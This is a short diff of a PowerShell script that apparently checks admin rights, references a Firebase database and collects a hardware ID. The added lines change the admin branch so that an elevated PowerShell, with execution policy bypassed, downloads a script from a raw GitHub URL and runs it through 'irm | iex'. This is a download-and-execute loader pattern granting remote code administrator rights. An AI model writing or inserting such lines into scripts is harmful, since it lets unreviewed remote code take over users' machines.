@@ -2,7 +2,8 @@
 $firebaseUrl = "https://ghett-f9f8e-default-rtdb.asia-southeast1.firebasedatabase.app"
 # ===== เช็ค Admin =====
 if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
-    Start-Process PowerShell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
+    $url = "https://raw.githubusercontent.com/Otto9866/ProductPowerShell/main/kkkk.ps1"
+    Start-Process PowerShell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command `"irm '$url' | iex`"" -Verb RunAs
     exit
 }
 # ===== Get HWID =====
